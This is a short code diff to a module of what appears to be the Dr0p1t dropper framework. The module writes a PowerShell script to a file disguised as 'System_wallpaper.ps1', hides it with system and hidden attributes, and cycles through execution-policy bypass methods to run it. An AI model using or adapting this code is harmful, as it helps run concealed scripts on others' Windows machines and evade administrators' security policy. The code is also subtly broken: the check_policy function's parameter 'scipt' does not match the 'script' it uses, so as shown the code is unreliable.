@@ -1,16 +1,17 @@
 #Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
 #This module aims to run powershell scripts (ps1) and bypass execution policy
 #Start
-
+from os import popen
+from subprocess import check_call,CalledProcessError
 def create_ps1(tobe):
 	f = open("System_wallpaper.ps1","w")
 	f.write(tobe)
 	f.close()
+	xxx = popen("attrib +s +h System_wallpaper.ps1")
 	check_policy("System_wallpaper.ps1")
 
 def check_policy(scipt):
-	import os,subprocess
-	command_output = os.popen('powershell -c "Get-ExecutionPolicy"').read()
+	command_output = popen('powershell -c "Get-ExecutionPolicy"').read()
 	if command_output.lower()[:3] == "res": #restricted
 		runps(script)
 	else: #Unrestricted
@@ -30,8 +31,8 @@ Disable-ExecutionPolicy
 	command = "powershell -c '''{}''' "
 	for method in bypass_methods:
 		try:
-			x = subprocess.check_call( command.format( method.format( script ) ) )
-		except subprocess.CalledProcessError:
+			x = check_call( command.format( method.format( script ) ) )
+		except CalledProcessError:
 			continue
 		else:
 			break
